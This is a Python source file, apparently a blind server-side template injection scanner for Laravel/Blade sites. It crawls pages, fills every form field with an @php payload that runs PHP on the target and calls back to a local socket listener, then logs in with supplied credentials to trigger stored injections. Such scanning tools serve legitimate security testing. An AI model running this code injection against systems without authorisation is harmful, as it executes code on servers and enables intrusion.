import re
import sys
from urllib.parse import urlparse
import urllib3.exceptions
import requests
import subprocess


def get_page_urls(html):
    """
    This function gets all href data in <a> tags and verifies which of them are in the current domain and removes extra
    characters if so
    """

    a_tags = re.findall(r'href="([^"]*)"', str(html))
    vue_urls = re.findall(r'to="([^"]*)"', str(html))
    all_tags = a_tags + vue_urls

    required_links = []
    for link in all_tags:
        required_links.append(link)
    return required_links



def locate_input_points(html):
    """
    This function finds all text input tags and returns their names
    """

    # find all input tags including token
    input_collection = re.findall(r"(<input [a-zA-Z0-9 _=\"\-'\\\\]*>)+", str(html))
    textarea_collection = re.findall(r"(<textarea [a-zA-Z0-9 _:;=\"\-'\\\\]*>)+", str(html))
    dropdown_collection = re.findall(r"(<select [a-zA-Z0-9 _:;=\"\-'\\\\]*>)+", str(html))
    total_inputs = input_collection+textarea_collection+dropdown_collection

    all_names = []  # array containing necessary input tags which will be used later
    for elem in total_inputs:  # loop through inputs, remove token & submit input
        if "_token" in elem:
            total_inputs.remove(elem)
        elif "type='submit'" in elem:
            total_inputs.remove(elem)

    for inp in total_inputs:  # filter through remaining valid inputs storing the names
        all_names += re.findall(r"(name=[\\\\'a-zA-Z0-9\"'\\\\']+)", inp)

    final_names = []
    input_counter = 0
    for elem in all_names:  # Clean names
        if("name=" in elem):  # Check that name= attribute exists, it is required to test
            temp_name = elem.replace("name=", "")
            temp_name = temp_name.replace("'", "")
            final_names.append(temp_name)
        input_counter+=1

    return final_names, input_counter


def filter_links(all_urls, hostname):
    """
    This function checks for duplicates in the total collection of links in the website and removes them
    """

    output = ""
    all_urls = list(dict.fromkeys(all_urls))
    temp_storage = []
    for url in all_urls:
        if (url != "#"):  # check that the url is not a # and
            temp_storage.append(url)

        if(str(urlparse(url).hostname) == hostname):
            temp_storage.append(url)

    for last_urls in temp_storage:  # This helps us remove unneeded urls and stay in session
        if (str(urlparse(last_urls).hostname) == hostname or str(urlparse(last_urls).hostname) == "None"):
            output += last_urls + "|"

    return output


def post_url(html):
    """
    This function finds all form action links in given html
    """

    post_link = re.findall(r"action=([a-zA-Z0-9_:;=./\"\-'\\\\]+)", html)[0]

    formatted_link = re.findall(r"(http://[a-zA-Z0-9_:;=./\-\\\\]+)", post_link)[0]

    return formatted_link


def get_token(html):
    """
    This function grabs the token for each given form
    """

    token = re.findall(r'<input type="hidden" name="_token" value="(.*)"', html)[0]
    return token


def get_forms(html):
    """
    This function takes html and finds all forms and their encapsulated html. It will extract action links and their inputs
    and pair them together.
    """

    form_groups = re.findall(r"(action=[a-zA-Z0-9 _:;=./\"\-<>\s\S'\\\\]+<\/form>)+", html)
    link_groups = {}
    input_count = 0

    for group in form_groups:
        action_link = post_url(group)
        input_links, input_count = locate_input_points(group)
        link_groups[action_link] = input_links

    return link_groups, input_count


def check_login_form(form_groups, login_page_url):
    """This function will check a collection of form groups to check if a login form is present in one of them"""

    for group in form_groups:  # Check each form group
        inputs = form_groups[group]

        if(len(inputs) == 2 or len(inputs) == 3):  # Checking that the count of form inputs is 2 or 3 indicating a login form as they generally require 2 or 3 inputs
            for inp in inputs:  # Check each input of each form group
                if "password" in inp:  # If an input has a password field than we return the whole group, inputs and page url
                    return group, inputs, login_page_url, True

    return "0", 0, "0", False


def check_nested_links(required_links, session, hostname):
    """
    Iterates through collected links and checks for new ones in them
    """

    nested_links = []
    for url in required_links:
        joined_url = url
        try:
            if (hostname not in joined_url):  # check if the url is not formatted properly
                joined_url = "http://" + hostname + url

            #response = urllib.request.urlopen(joined_url)
            response = session.get(joined_url)
            html = response.text

            a_tags = re.findall(r'href="([^"]*)"', str(html))
            vue_urls = re.findall(r'to="([^"]*)"', str(html))
            all_tags = a_tags + vue_urls

            for link in all_tags:
                nested_links.append(link)
        except Exception:
            pass
    return nested_links


# def filter_links(all_urls, hostname):
#     """
#     This function checks for duplicates in the total collection of links in the website and removes them
#     """
#
#     output = ""
#     all_urls = list(dict.fromkeys(all_urls))
#     temp_storage = []
#     for url in all_urls:
#         if(url != "#" or str(urlparse(url).hostname) == hostname):  # check that the url is not a # and
#             temp_storage.append(url)
#
#     for last_urls in temp_storage:  # This helps us remove unneeded urls and stay in session
#         if(str(urlparse(last_urls).hostname) == hostname or str(urlparse(last_urls).hostname) == "None"):
#             output += last_urls + "|"
#
#     return output


def test_blind_posterior(urls):
    """
    This function performs SSTI on all forms in pages. This works by sending a connection request to a socket
    server that will run after all forms have been filled. The socket server will then confirm injection success based
    on if a connection is received or not.
    """

    login_found = False
    login_page_url = ""
    login_form_url = ""
    login_inputs = {}

    for url in urls:
        session = requests.session()
        front = session.get(url)

        groups, input_no = get_forms(front.text)

        # Check if we have already been to the login page to avoid overriding the values, also avoid the registration page
        # if("register" not in front.text):
        if (login_found == False):
            login_form_url, login_inputs, login_page_url, login_found = check_login_form(groups, url)
        else:
            break

    for url in urls:
        try:
            session = requests.session()
            front = session.get(url)

            token = get_token(front.text)
            cookies = session.cookies

            groups, input_no = get_forms(front.text)
            post_data = {}


            for group in groups:
                # Get the inputs for each form group iteratively
                inputs = groups[group]

                for inp in inputs:  # Give each input a value and add to dictionary
                    post_data[inp] = f"""@php 
                                              try{{
                                                  $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https://" : "http://";
                                                  $url = $protocol . $_SERVER['SERVER_NAME'] . ":". $_SERVER['SERVER_PORT'] . $_SERVER['REQUEST_URI']; 
                                                  $sock = fsockopen('localhost', 9000);
                                                  fwrite($sock, 'Injection detected from form {group}, on page: {url}. Code was executed on '. $url); 
                                                  fclose($sock);
                                              }}
                                              catch(Exception $e){{}}
                                         @endphp"""
                post_data["_token"] = token  # Add token last

                req = None
                try:
                    req = requests.post(group, data=post_data, cookies=cookies)
                except (urllib3.exceptions.MaxRetryError, requests.exceptions.ConnectionError):
                    print(
                        "Unable to perform test on " + url + " on form link " + group + " as it is an authentication page")
                    continue

        except IndexError:
            continue


    cred_names = sys.argv[2]  # Getting the login credentials inputted at the beginning
    cred_vals = sys.argv[3]

    name_array = cred_names.split(" ")
    val_array = cred_vals.split(" ")

    blind_data = {}

    input_count = 0
    for inpt in login_inputs:  # For each input found in the login form
        blind_data[name_array[input_count]] = val_array[input_count]  # use cred name & val arrays to get inputted names and values
        input_count+=1

    blind_session = requests.session()  # Create a blind session

    login_page = blind_session.get(login_page_url)  # Get the login page html
    blind_cookies = blind_session.cookies

    login_token = get_token(login_page.text)  # Extract the form token
    blind_data["_token"] = login_token

    hostname = urlparse(login_form_url).hostname  # Hostname to use later
    login_response = blind_session.post(login_form_url, blind_data, blind_cookies)  # Performing login

    # Start up the socket server
    server_instance = subprocess.Popen(['python', 'SocketServer.py'])

    if(login_response.status_code == 200):  # Login successful
        front = login_response.text
        new_urls = get_page_urls(front)

        nested_links = check_nested_links(new_urls, blind_session, hostname)  # Check for links inside the new pages
        filtered_urls = filter_links(new_urls + nested_links, hostname)  # Form a collection of new_urls and nested urls
        split_urls = list(filtered_urls.split("|"))  # split the filtered_urls string

        to_scan = []
        for unique_url in split_urls:
            if(unique_url not in urls):  # If the current URL is not present in the list of URLs we have already seen
                to_scan.append(unique_url)
        to_scan.pop(-1)  # Removing the last element as it is an empty string


        for blind_url in to_scan:  # visit URLs
            try:
                blind_session.get(blind_url)
            except Exception:  # Try catch to ignore urls that do not have http in the string
                pass

        server_instance.terminate()
    else:
        print("\n\nFailed to authenticate to perform blind scan. The scan will now stop\n\n")


urls = sys.argv[1]
urls_list = list(urls.split(" "))
test_blind_posterior(urls_list)
